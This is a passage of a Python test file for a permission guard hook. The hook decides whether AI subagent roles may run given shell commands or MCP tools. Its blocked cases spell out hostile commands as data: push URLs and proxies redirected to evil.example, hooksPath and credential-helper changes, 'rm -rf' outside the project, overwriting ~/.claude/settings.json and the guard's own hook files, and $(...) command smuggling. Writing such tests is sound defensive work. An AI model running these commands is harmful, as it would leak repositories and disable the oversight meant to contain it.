    + [("dev", c, "allow") for c in [
        "echo x > src/a.js",
        "cat LICENSE",
        "cp LICENSE /tmp/etk-LICENSE",
        "echo x > src/legacy/sub/a.ts",
        "ls db/migrations",
        "git diff db/migrations",
        "echo x > docs/LICENSE.md",
    ]]
)

# R1-15: quoted text and heredoc bodies are data; live substitutions and shell input are code.
QUOTING = (
    [("dev", c, "allow") for c in [
        "echo '$(git push)'",
        "echo '`git push`'",
        "git commit -m 'run $(git push) later'",
        "cat > notes.md <<EOF\nnpm publish\ngit push\nEOF",
        "cat <<'EOF'\n$(git push)\nEOF",
        "cat > a.md <<'EOF'\nkubectl apply -f x\nEOF",
        "grep -rn 'npm publish' docs/",
        "echo \"it's $(date)\"",
        "tee /tmp/a < x",
        "cat <<< 'git push'",
    ]]
    + [("dev", c, "block") for c in [
        "echo \"$(git push)\"",
        "echo `git push`",
        "x=$(git push)",
        "cat <<EOF\n$(git push)\nEOF",
        "cat <<EOF\n`git push`\nEOF",
        "bash <<EOF\ngit push\nEOF",
        "bash <<'EOF'\ngit push\nEOF",
        "sh <<-EOF\n\tgit push\n\tEOF",
        "bash -c \"$(git push)\"",
        "echo \"it's $(git push)\"",
    ]]
    + [("rev", "cat <<EOF > src/a.js\nx\nEOF", "block"), ("rev", "cat <<EOF > /tmp/etk.txt\nx\nEOF", "allow"),
       ("rev", "tee /tmp/a < x", "allow"), ("rev", "echo '$(rm src/a.js)'", "allow")]
)

# Wrapper options that change directory aren't tracked: use cd.
WRAPPER_CHDIR = (
    [("dev", c, "block") for c in [
        "env -C /tmp ls",
        "env -C/tmp ls",
        "env --chdir=/tmp ls",
        "env --chdir /tmp ls",
        "sudo -D /tmp ls",
        "sudo -D/tmp ls",
        "sudo --chdir=/tmp ls",
        "sudo -R /x ls",
        "sudo --chroot /x ls",
        "env -C .. rm -rf other",
    ]]
    + [("dev", c, "allow") for c in ["env FOO=1 ls", "sudo -u root ls", "env -i FOO=1 ls"]]
    + [("rev", "env -C /tmp tee z", "block")]
)

# `etk.sh exec GATE --type T -- CMD` runs CMD, so CMD is judged like any other command.
ETK_EXEC = (
    [("dev", c, "block") for c in [
        "etk.sh exec G3 --type test -- git push",
        "sh scripts/etk.sh exec G3 --type test -- git push",
        "${CLAUDE_PLUGIN_ROOT}/scripts/etk.sh exec G3 --type test -- git push",
        "python3 scripts/etk_run.py exec G3 --type test -- git push",
        "python3.12 scripts/etk_run.py exec G3 --type test -- rm -rf /etc/x",
        "etk.sh exec G3 --type test",
        "etk.sh exec G3 --type test npm test",
        "etk.sh exec G3 --type test -- rm -rf ../../../other",
        "etk.sh exec G3 --type test -- bash -c 'git push'",
        "etk.sh exec G3 --type test -- kubectl -n prod apply -f x.yml",
        "timeout 60 etk.sh exec G3 --type test -- git push",
    ]]
    + [(r, "etk.sh exec G3 --type test -- npm test", "block") for r in ("rev", "ux", "scout", "tw")]
    + [("qa", c, "block") for c in [
        "etk.sh exec G3 --type test -- sed -i s/a/b/ src/a.js",
        "etk.sh exec G3 --type test -- git checkout main -- src/a.js",
        "python3 scripts/etk_run.py exec G3 --type test -- cp x tests/existing.test.js",
    ]]
    + [(r, c, "allow") for r in ("dev", "qa") for c in [
        "etk.sh exec G3 --type test -- npm test",
        "sh scripts/etk.sh exec G3 --type test -- pytest -q",
        "python3 scripts/etk_run.py exec G3 --type test -- npm test",
        "etk.sh discover",
        "etk.sh run latest",
    ]]
    + [("rev", "etk.sh run latest", "allow"), ("rev", "etk.sh discover", "allow")]
)

# Read-only git: only options known to be read-only, so abbreviations can't sneak a program in.
GIT_OPTIONS = (
    [(r, c, "block") for r in ("rev", "qa") for c in [
        "git diff --ext",
        "git diff --ext-diff",
        "git log --textconv",
        "git show --textc HEAD:a",
        "git grep --open-files",
        "git grep --open-files-in-pager=sh x",
        "git grep -O sh x",
        "git grep -Osh x",
        "git ls-remote --upload origin",
        "git ls-remote --upload-pack=x origin",
        "git ls-remote --receive-pack=x origin",
        "git diff --output=x",
        "git diff --outp=x",
        "git log --output x",
        "git --exec-path=/x log",
        "git --git-dir=/x log",
        "git --work-tree=/x status",
        "git --paginate log",
        "git -c core.pager=x log",
        "git log --unknown-flag",
        "git status --ign=all",
        "git cat-file --textconv HEAD:a",
        "git cat-file --filters HEAD:a",
    ]]
    + [(r, c, "allow") for r in ("rev", "qa") for c in [
        "git diff --stat --cached",
        "git diff -U5 main",
        "git diff -w --name-only",
        "git diff --diff-filter=ACMR --name-only main...HEAD",
        "git diff HEAD~1 HEAD --name-status",
        "git log --oneline -5",
        "git log -n 5 --format=%H",
        "git log --since=2.days --author=x",
        "git log -p -- src",
        "git log --graph --decorate --all",
        "git show --stat HEAD",
        "git show HEAD:README.md",
        "git status -sb",
        "git status --porcelain=v2 --branch",
        "git grep -n -i -e foo",
        "git grep -l --untracked foo",
        "git blame -L 1,5 src/a.js",
        "git blame --line-porcelain src/a.js",
        "git rev-parse --show-toplevel",
        "git rev-parse --abbrev-ref HEAD",
        "git ls-files --others --exclude-standard",
        "git ls-files -z",
        "git merge-base --is-ancestor main HEAD",
        "git -C . log --oneline",
        "git --no-pager log -3",
        "git cat-file -p HEAD",
        "git for-each-ref --format=%(refname) refs/heads",
        "git describe --tags --always",
        "git shortlog -sn",
        "git ls-tree -r HEAD --name-only",
    ]]
)

# Environment that points git at other config or repositories.
GIT_ENV = (
    [(r, c, "block") for r in ("rev", "qa") for c in [
        "HOME=/tmp/x git log",
        "XDG_CONFIG_HOME=/tmp/x git log",
        "GIT_DIR=/x git log",
        "GIT_WORK_TREE=/x git status",
        "GIT_CONFIG=/x git log",
        "GIT_CONFIG_NOSYSTEM=1 git log",
        "GIT_COMMON_DIR=/x git log",
        "GIT_INDEX_FILE=/x git status",
        "env HOME=/tmp git log",
        "export HOME=/tmp; git log",
        "HOME=/tmp; git log",
        "declare -x XDG_CONFIG_HOME=/tmp; git log",
    ]]
    + [(r, c, "allow") for r in ("rev", "qa") for c in [
        "LANG=C git log",
        "LC_ALL=C git status",
        "TZ=UTC git log",
        "FOO=1 npm test",
    ]]
    + [("dev", "HOME=/tmp/x git log", "allow"), ("dev", "GIT_DIR=.git git log", "allow")]
)

# etk exec behind interpreter options, or in a form we can't read.
ETK_EXEC_FORMS = (
    [("dev", c, "block") for c in [
        "python3 -u scripts/etk_run.py exec G3 --type test -- git push",
        "sh -e scripts/etk.sh exec G3 --type test -- git push",
        "bash -x -e etk.sh exec G3 --type test -- git push",
        "env X=1 etk.sh exec G3 --type test -- git push",
        "python3 -u etk_run.py --foo exec G3 --type test -- npm test",
        "sh -e etk.sh --foo exec G3 --type test -- npm test",
    ]]
    + [(r, "python3 -u scripts/etk_run.py exec G3 --type test -- npm test", "block") for r in ("rev", "scout")]
    + [("dev", c, "allow") for c in [
        "python3 -u scripts/etk_run.py exec G3 --type test -- npm test",
        "python3 -u scripts/etk_run.py run latest",
        "sh -e scripts/etk.sh discover",
        "cat scripts/etk.sh",
        "grep exec scripts/etk.sh",
    ]]
)

# Subcommands outside the diff/log family keep working with their usual options.
GIT_OTHER_OPTIONS = (
    [(r, c, "allow") for r in ("rev", "qa") for c in [
        "git remote -v",
        "git worktree list --porcelain",
        "git stash list",
        "git stash show --stat",
        "git reflog show --date=iso",
        "git submodule status --recursive",
        "git branch --list -a",
        "git tag -l --sort=-creatordate",
    ]]
    + [("qa", c, "allow") for c in ["git add -A tests", "git add -u", "git commit -m 'add tests'", "git commit -am 'x'",
                                    "git commit -q --allow-empty -m x", "git worktree add --detach ../base HEAD"]]
    + [("qa", c, "block") for c in ["git add -f tests/x", "git add -p", "git commit --amend -m x",
                                    "git commit --no-gpg-sign -S", "git worktree add --lock ../base HEAD"]]
    + [("rev", c, "block") for c in ["git remote -v --foo", "git stash list --bogus"]]
)

# Read forms that read-only roles legitimately use.
READ_ONLY_READS = (
    [(r, c, "allow") for r in ("rev", "qa") for c in [
        "git log -L 1,2:README.md",
        "git log -L1,2:README.md",
        "git show -L 1,2:README.md HEAD",
        "git config user.name",
    ]]
    + [("rev", c, "allow") for c in [
        "wget -qO- https://example.com",
        "wget -O- https://example.com",
        "wget -qO /tmp/etk-f https://example.com",
    ]]
    + [(r, c, "block") for r in ("rev", "qa") for c in ["git config user.name x", "git config --global user.name",
                                                         "git -c color.ui=never log -1"]]
    + [("rev", c, "block") for c in ["wget -qO out.txt https://example.com", "wget -qOout.txt https://example.com",
                                     "wget -O out.txt https://example.com"]]
)

# Security review: `cd ~`/`cd $HOME` into the data dir or run records, git config that
# redirects pushes or runs programs, and `run init` are Lead-only.
CD_HOME = (
    [("dev", c, "block") for c in [
        "cd ~/.claude/plugins/data/etk && echo x > p.json",
        "cd $HOME/.claude/plugins && echo x > data/etk/p.json",
        "cd ${HOME}/.claude/plugins && echo x > data/etk/p.json",
        "cd ~/.claude && cd plugins && echo x > data/etk/p.json",
        "cd ~/../r2/.etk && echo x > runs/a/gates.json",
        "pushd ~/.claude/plugins/data/etk && touch p.json",
        "cd ~ && rm -rf scratch",
    ]]
    + [("rev", "cd ~/.claude/plugins/data/etk && cat p.json", "block")]
    + [(r, "cd ~ && ls", "allow") for r in ("dev", "rev", "qa")]
    + [("dev", c, "allow") for c in ["cd $HOME && ls -la", "cd ~/notes && cat a.md"]]
)
GIT_REMOTE_CONFIG = (
    [(r, c, "block") for r in ("dev", "qa") for c in [
        "git config remote.origin.url https://github.com/victim/prod",
        "git config remote.origin.pushurl https://evil.example/x.git",
        "git config --add remote.origin.pushurl https://evil.example/x.git",
        "git config --local Remote.Origin.PushURL x",
        "git config url.https://evil.example/.insteadOf https://github.com/",
        "git config --global url.x.pushInsteadOf https://github.com/",
        "git config core.hooksPath /tmp/hooks",
        "git config core.sshCommand 'ssh -o ProxyCommand=x'",
        "git config http.proxy http://evil.example:3128",
        "git config http.https://github.com/.proxy http://evil.example:3128",
        "git config --global http.sslVerify false",
        "git config http.extraHeader 'X: y'",
        "git config submodule.recurse true",
        "git config submodule.lib.url https://evil.example/x.git",
        "git config remote.origin.receivepack /tmp/x",
        "git config remote.origin.vcs ext",
        "git config push.recurseSubmodules on-demand",
        "git config core.fsmonitor ./watch.sh",
        "git config filter.x.clean 'touch y'",
        "git config diff.x.textconv cat",
        "git config credential.helper store",
        "git config include.path ../evil.cfg",
        "git config includeIf.gitdir:~/.path ../evil.cfg",
        "git config --file .git/config remote.origin.url x",
        "git config -f=.git/config remote.origin.url x",
        "git config --type=path core.hooksPath x",
        "git config --type path core.hooksPath x",
        "git config --unset core.hooksPath",
        "git config --rename-section foo remote.origin",
        "git config --remove-section remote.origin",
        "git config --edit",
        "git config set remote.origin.url x",
        "git config unset remote.origin.pushurl",
        "git -C . config remote.origin.url x",
        "git remote add evil https://evil.example/x.git",
        "git remote set-url origin https://evil.example/x.git",
        "git remote set-url --push origin https://evil.example/x.git",
        "git remote rename origin old",
        "git remote remove origin",
        "git remote rm origin",
        "echo '[remote \"origin\"]' >> .git/config",
        "cp x .git/hooks/pre-push",
        "cd .git && echo x > config",
    ]]
    + [(r, c, "allow") for r in ("dev", "rev", "qa") for c in [
        "git config --get remote.origin.url",
        "git config remote.origin.url",
        "git config --get-regexp '^remote\\.'",
        "git config -l",
        "git remote -v",
        "git remote get-url --push origin",
        "git remote show origin",
        "cat .git/config",
    ]]
    + [("dev", c, "allow") for c in ["git config user.name 'Dev Bot'", "git config get remote.origin.url",
                                     "git config --local core.autocrlf false"]]
)
# Second review: more keys and files that redirect a push or make git run a program, and
# HOME changes spelled with quotes or backslashes.
GIT_CONFIG_MORE = (
    [(r, c, "block") for r in ("dev", "qa") for c in [
        "git config branch.main.pushRemote evil",
        "git config branch.main.remote evil",
        "git config remote.pushDefault evil",
        "git config alias.st '!touch x'",
        "git config core.pager 'sh x'",
        "git config core.editor 'sh x'",
        "git config core.askPass ./x",
        "git config gpg.program ./x",
        "git config commit.gpgSign true",
        "git config sequence.editor ./x",
        "git config merge.x.driver ./x",
        "git config push.default current",
        "echo x >> ~/.gitconfig",
        "echo x > .git/config.worktree",
        "echo x > .git/worktrees/w/config",
        "echo '* filter=x' > .git/info/attributes",
        "echo x > ~/.config/git/config",
    ]]
    + [("dev", c, "block") for c in [
        'H"OME"=/x cd ~/.claude/plugins/data/etk && echo x > p.json',
        "HO\\ME=/x cd ~/.claude/plugins/data/etk && echo x > p.json",
    ]]
    + [("dev", c, "allow") for c in ["git config user.email dev@example.com", "cat ~/.gitconfig",
                                     "git config --get branch.main.remote"]]
)
# Third review: user-level files that decide what runs (settings, installed plugins, the Python
# folders the launchers search) are the user's, not a subagent's.
TOOL_HOME = (
    [(r, c, "block") for r in ("dev", "qa") for c in [
        "echo '{}' > ~/.claude/settings.json",
        "echo '{}' > $HOME/.claude/settings.local.json",
        "cp x ~/.claude/plugins/cache/m/p/1.0/hooks/guard.py",
        "touch ~/.claude/plugins/cache/m/p/1.0/hooks/run-guard.sh",
        "ln -s /bin/true ~/.pyenv/versions/0/bin/python3",
        "cp x ~/.local/share/uv/python/cpython-3.12/bin/python3",
        "ln -sf /bin/true ~/.local/bin/python3.12",
        "tee ~/.claude/hooks/x.sh",
        "echo x > ~/.CLAUDE/settings.json",
        "echo x > ~/.claude/CLAUDE.md",
        "echo x > ~/.claude.json",
        "ln -sf /bin/true ~/.pyenv/shims/python3",
        "ln -sf /bin/true ~/.asdf/shims/python3",
        "cd ~/nowhere-$X && cp x .pyenv/versions/0/bin/python3",
    ]]
    + [(r, c, "allow") for r in ("dev", "rev", "qa") for c in [
        "cat ~/.claude/settings.json",
        "ls ~/.pyenv/versions",
        "cat ~/.claude/plugins/cache/m/p/1.0/hooks/guard.py",
    ]]
    + [("dev", c, "allow") for c in ["echo x > ~/notes.md", "touch ~/.local/bin/mytool"]]
)
ETK_INIT = (
    [(r, c, "block") for r in ("dev", "qa", "rev") for c in [
        'sh "${CLAUDE_PLUGIN_ROOT}/scripts/etk.sh" run init "Ship it" --kind ship',
        "python3 scripts/etk_run.py init x",
    ]]
    + [(r, c, "allow") for r in ("dev", "rev") for c in [
        'sh "${CLAUDE_PLUGIN_ROOT}/scripts/etk.sh" run ready',
        "python3 scripts/etk_run.py ready",
    ]]
)

CASES = (BENIGN + BASELINE_BLOCKS + R1_1_CD + R1_2_COMPOUND + PROCESS_SUBST + CD_UNKNOWN + SHELL_ARGV
         + WRAPPER_OPTS + CD_FAIL_CLOSED + SHELL_CLUSTERS + WRAPPER_EDGES + CD_LATER_AND_BUILTINS + WRAPPER_EDGES_2 + TRAP_STRICT + STARTUP_VARS + NESTED_TIME_OUTPUT + BACKGROUND_CD + CREATED_OPERAND + GIT_CHECKOUT + GIT_DIR_AND_CLEAN + DEPLOY_FORMS + SECRET_WRITES + READ_ONLY_MUTATIONS + QA_LEAKS + FIND_WRITES + GIT_RUNS_PROGRAMS + PROTECTED + QUOTING + WRAPPER_CHDIR + ETK_EXEC + GIT_OPTIONS + GIT_ENV + ENV_LOOKALIKES + ETK_EXEC_FORMS + GIT_OTHER_OPTIONS + READ_ONLY_READS + NESTED_ENV
         + CD_HOME + GIT_REMOTE_CONFIG + GIT_CONFIG_MORE + TOOL_HOME + ETK_INIT)


def make_project(base: Path) -> Path:
    def run(*args):
        subprocess.run(args, cwd=base, check=True, capture_output=True)

    base.mkdir(parents=True, exist_ok=True)
    run("git", "init", "-q", "-b", "main")
    (base / "src").mkdir()
    (base / "tests").mkdir()
    (base / "src" / "a.js").write_text("a\n")
    (base / "tests" / "existing.test.js").write_text("t\n")
    (base / "README.md").write_text("r\n")
    os.symlink("/dev/stdin", base / "stdin-link")
    (base / ".claude").mkdir()
    (base / ".claude" / "engineering-team.json").write_text(json.dumps(
        {"protected_paths": ["db/migrations/", "infra/**", "LICENSE", "src/legacy/*.js"]}))
    run("git", "add", "-A")
    run("git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "init")
    run("git", "branch", "feature")
    return base


# R1-9: MCP tools. (role, tool name, verdict)
MCP_CASES = [(r, t, "block") for r in ("dev", "rev", "qa") for t in [
    "mcp__github__create_pull_request", "mcp__github__merge_pull_request", "mcp__github__push_files",
    "mcp__x__deleteFile", "mcp__x__write_file", "mcp__x__update_issue", "mcp__plugin_x__publish_page",
    "mcp__LitGroup_Preview__deploy_mockup", "mcp__claude_ai_Claude_Docs__update",
    "mcp__x__resolve_conflict", "mcp__x__reopen_issue",
]] + [(r, t, "allow") for r in ("dev", "rev", "qa") for t in [
    "mcp__github__get_file_contents", "mcp__github__list_issues", "mcp__github__search_code",
    "mcp__claude-in-chrome__navigate", "mcp__claude-in-chrome__computer", "mcp__claude-in-chrome__form_input",
    "mcp__playwright__browser_click", "mcp__plugin_playwright_playwright__browser_navigate",
    "mcp__claude-vscode__getDiagnostics",
    "mcp__context7__resolve-library-id", "mcp__context7__get-library-docs",
    "mcp__plugin_context7_context7__resolve-library-id", "mcp__plugin_context7_context7__get-library-docs",
    "mcp__github__get_pull_request",
    "mcp__sentry__get_issue_details", "mcp__linear__list_issues", "mcp__chrome-devtools__upload_file",
    "mcp__plugin_chrome-devtools-mcp_chrome-devtools__click",
]]


def repo_under_system_temp() -> bool:
    return Path(tempfile.gettempdir()).resolve() in ROOT.resolve().parents


class GuardCorpus(unittest.TestCase):
    def skip_if_repo_under_temp(self):
        # The fixture sits under tests/, so a checkout inside the system temp dir puts the
        # "project" inside what the guard treats as scratch space and escape cases misjudge.
        if repo_under_system_temp():
            self.skipTest(f"repo is under the system temp dir ({tempfile.gettempdir()}); "
                          "clone it elsewhere to run the escape-from-project cases")

    @classmethod
    def setUpClass(cls):
        # Outside the system temp dir, which the guard treats as scratch space.
        cls.tmp = tempfile.TemporaryDirectory(dir=ROOT / "tests", prefix=".corpus-")
        cls.project = make_project(Path(cls.tmp.name) / "proj")

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def verdict(self, role, cmd):
        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(self.project),
                "agent_type": ROLES[role]}
        with contextlib.redirect_stderr(io.StringIO()):
            return "block" if guard.decide(data) is not None else "allow"

    def test_inherited_cdpath_makes_relative_cd_unknown(self):
        self.skip_if_repo_under_temp()
        with mock.patch.dict(os.environ, {"CDPATH": "/etc"}):
            self.assertEqual(self.verdict("dev", "cd src && rm -rf build"), "block")
            self.assertEqual(self.verdict("dev", "cd ./src && rm -rf build"), "allow")
            self.assertEqual(self.verdict("dev", "cd /tmp && rm -rf scratch"), "allow")

    def test_mcp_tools(self):
        for role, tool, want in MCP_CASES:
            with self.subTest(role=role, tool=tool):
                data = {"tool_name": tool, "tool_input": {}, "cwd": str(self.project), "agent_type": ROLES[role]}
                self.assertEqual("block" if guard.decide(data) is not None else "allow", want)
        data = {"tool_name": "mcp__github__push_files", "tool_input": {}, "cwd": str(self.project)}
        self.assertIsNone(guard.decide(data), "main session is not guarded")

    def test_protected_paths_apply_to_write_tools(self):
        self.skip_if_repo_under_temp()
        for role in ROLES:
            for tool in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
                for path in ("db/migrations/002.sql", "infra/a/b.tf", "LICENSE", str(self.project / "LICENSE"),
                             "src/legacy/old.js"):
                    key = "notebook_path" if tool == "NotebookEdit" else "file_path"
                    data = {"tool_name": tool, "tool_input": {key: path}, "cwd": str(self.project),
                            "agent_type": ROLES[role]}
                    with self.subTest(role=role, tool=tool, path=path):
                        self.assertIsNotNone(guard.decide(data))
        data = {"tool_name": "Write", "tool_input": {"file_path": "db/migrations/002.sql"}, "cwd": str(self.project)}
        self.assertIsNone(guard.decide(data), "main session is not guarded")
        data = {"tool_name": "Write", "tool_input": {"file_path": "src/new.js"}, "cwd": str(self.project),
                "agent_type": ROLES["dev"]}
        self.assertIsNone(guard.decide(data))

    def test_write_tools_cannot_touch_user_level_tool_files(self):
        home = os.path.expanduser("~")
        for role in ("dev", "qa"):
            for path in (f"{home}/.claude/settings.json", f"{home}/.claude/plugins/cache/m/p/hooks/guard.py",
                         f"{home}/.pyenv/versions/0/bin/python3", f"{home}/.local/bin/python3.12"):
                data = {"tool_name": "Write", "tool_input": {"file_path": path}, "cwd": str(self.project),
                        "agent_type": ROLES[role]}
                with self.subTest(role=role, path=path):
                    self.assertIsNotNone(guard.decide(data))

    def test_globs_into_the_claude_folder_are_expanded_like_the_shell_does(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp).resolve()
            (home / ".claude").mkdir()
            (home / ".claude" / "settings.json").write_text("{}")
            with mock.patch.dict(os.environ, {"HOME": str(home)}):
                for cmd in (f"echo x > {home}/.cl*/settings.json", f"echo x > {home}/.c[l]aude/settings.json"):
                    with self.subTest(cmd=cmd):
                        data = {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(self.project),
                                "agent_type": ROLES["dev"]}
                        self.assertIsNotNone(guard.decide(data))
            # a pattern that matches more than the cap is blocked rather than guessed at
            (home / ".local" / "bin").mkdir(parents=True)
            for i in range(guard.GLOB_CAP + 2):
                (home / ".local" / "bin" / f"py{i}").write_text("")
            with mock.patch.dict(os.environ, {"HOME": str(home)}):
                data = {"tool_name": "Bash", "tool_input": {"command": f"echo x > {home}/.local/bin/py*"},
                        "cwd": str(self.project), "agent_type": ROLES["dev"]}
                self.assertIsNotNone(guard.decide(data))
                link = Path(tmp).resolve() / "lnk"
                link.symlink_to(home)  # a symlink to the home folder hides the prefix
                for cmd in (f"echo x > {home}/x*/../.claude/settings.json", f"echo x > {link}/.cl*/settings.json"):
                    data["tool_input"]["command"] = cmd
                    with self.subTest(cmd=cmd):
                        self.assertIsNotNone(guard.decide(data))
                proj = home / "proj"
                proj.mkdir()
                (proj / "lnk").symlink_to(home / ".claude")  # a symlink inside the wildcard part
                for cmd in (f"echo x > {proj}/*/settings.json", f"echo x > {home}/.c*/.*/x",
                            f"echo x > {home}/pr*/.*/.claude/settings.json"):
                    data["tool_input"]["command"] = cmd
                    with self.subTest(cmd=cmd):
                        self.assertIsNotNone(guard.decide(data))
                for cmd in (f"echo x > {home}/*/*/*/f", f"echo x > {home}/**/f"):  # could walk the whole home
                    data["tool_input"]["command"] = cmd
                    with self.subTest(cmd=cmd):
                        self.assertIsNotNone(guard.decide(data))
                for cmd in (f"echo x > {self.project}/src/*/*/f",):  # can't reach a guarded folder: left alone
                    data["tool_input"]["command"] = cmd
                    with self.subTest(cmd=cmd):
                        self.assertIsNone(guard.decide(data))

    def test_a_check_that_runs_out_of_time_blocks(self):
        code = ("import io, sys, time; sys.path.insert(0, %r); import guard; guard.BUDGET_SECONDS = 1; "
                "guard.decide = lambda d: time.sleep(30); sys.stdin = io.StringIO('{}'); sys.exit(guard.main())"
                % str(ROOT / "hooks"))
        started = time.time()
        r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=20)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("ran out of time", r.stderr)
        self.assertLess(time.time() - started, 15)

    def test_unexpected_errors_block_etk_agents(self):
        agent = ROLES["dev"]
        cases = [
            {"tool_name": "Bash", "tool_input": ["git", "status"], "cwd": str(self.project), "agent_type": agent},
            {"tool_name": "Bash", "tool_input": {"command": "cd src && ls"}, "cwd": 12, "agent_type": agent},
            {"tool_name": "Write", "tool_input": {"file_path": "a\0b"}, "cwd": str(self.project), "agent_type": agent},
            {"tool_name": "Bash", "tool_input": {"command": "cat a\0b > /tmp/x\0y"}, "cwd": str(self.project),
             "agent_type": agent},
        ]
        for data in cases:
            with self.subTest(data=data):
                self.assertIn("guard error", guard.decide(data) or "")
        self.assertIsNone(guard.decide(["not", "a", "dict"]))

    def test_unlistable_untracked_files_block_bulk_add(self):
        data = {"tool_name": "Bash", "tool_input": {"command": "git add -A"}, "cwd": str(self.project),
                "agent_type": ROLES["dev"]}
        self.assertIsNone(guard.decide(data))
        for exc in (subprocess.TimeoutExpired("git", 5), OSError("no git")):
            with mock.patch.object(guard.subprocess, "run", side_effect=exc):
                self.assertIn("untracked", guard.decide(data) or "", exc)

    def test_wrapper_blocks_when_guard_crashes(self):
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / "python3"
            fake.write_text('#!/bin/sh\nif [ "$1" = "-c" ]; then echo etk-ok; exit 0; fi\nexit 1\n')
            fake.chmod(0o755)
            env = dict(os.environ, PATH=f"{tmp}:{os.environ['PATH']}")
            payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"}, "cwd": "/",
                                  "agent_type": ROLES["dev"]})
            r = subprocess.run(["sh", str(ROOT / "hooks" / "run-guard.sh")], input=payload, env=env,
                               capture_output=True, text=True)
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertIn("guard error", r.stderr)

    def test_every_allowlisted_git_subcommand_has_an_option_list(self):
        missing = (guard.GIT_READ | guard.QA_GIT) - set(guard.GIT_OPTION_ALLOW)
        self.assertEqual(missing, set())

    def test_git_subcommand_without_option_list_refuses_options(self):
        with mock.patch.dict(guard.GIT_OPTION_ALLOW):
            del guard.GIT_OPTION_ALLOW["diff"]
            self.assertEqual(guard.unknown_git_option("diff", ["--stat"]), "--stat")
            self.assertIsNone(guard.unknown_git_option("diff", ["HEAD", "--", "-x"]))
            self.assertEqual(self.verdict("rev", "git diff --stat"), "block")
            self.assertEqual(self.verdict("rev", "git diff HEAD"), "allow")

    def test_hook_matcher_covers_every_tool(self):
        hooks = json.loads((ROOT / "hooks" / "hooks.json").read_text())
        self.assertEqual(hooks["hooks"]["PreToolUse"][0]["matcher"], "*")

    def test_other_shell_tools_and_unknown_tools(self):
        self.skip_if_repo_under_temp()

        def run(role, tool, inp):
            data = {"tool_name": tool, "tool_input": inp, "cwd": str(self.project), "agent_type": ROLES[role]}
            with contextlib.redirect_stderr(io.StringIO()):
                return "block" if guard.decide(data) is not None else "allow"
        for role in ("dev", "rev", "qa"):
            with self.subTest(role=role):
                self.assertEqual(run(role, "Monitor", {"command": "git push origin main"}), "block")
                self.assertEqual(run(role, "Monitor", {"command": "rm -rf /home/x"}), "block")
                self.assertEqual(run(role, "Monitor", {"command": "git status"}), "allow")
                self.assertEqual(run(role, "PowerShell", {"command": "git push"}), "block")
                self.assertEqual(run(role, "CronCreate", {}), "block")
                for tool in ("Read", "Grep", "Glob", "WebFetch", "TodoWrite"):
                    self.assertEqual(run(role, tool, {}), "allow", tool)
        self.assertIsNone(guard.decide({"tool_name": "Monitor", "tool_input": {"command": "git push"},
                                        "cwd": str(self.project)}), "main session is not guarded")

    def test_corpus(self):
        self.skip_if_repo_under_temp()
        for role, cmd, want in CASES:
            with self.subTest(role=role, cmd=cmd):
                self.assertEqual(self.verdict(role, cmd), want)


if __name__ == "__main__":
    unittest.main()
